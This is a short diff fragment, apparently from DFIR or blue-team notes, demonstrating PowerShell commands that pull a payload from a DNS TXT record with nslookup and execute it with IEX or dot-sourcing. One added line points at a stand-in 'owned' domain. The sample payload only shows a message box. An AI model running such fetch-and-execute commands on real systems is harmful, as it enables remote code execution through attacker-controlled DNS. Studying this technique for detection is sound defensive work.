@@ -38,3 +38,4 @@ $b64=(IEX(nslookup -q=txt http://test.dfir.com.au  2>$null)[-1]);[System.Text.En
 % dig txt dfir.<redacted>.<tld> +short
 [System.Reflection.Assembly]::LoadWithPartialName('http://System.Windows.Forms'); [http://System.Windows.Forms.MessageBox]::Show('DFIR FTW!','BlueTeam <3')
 
+"powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]"
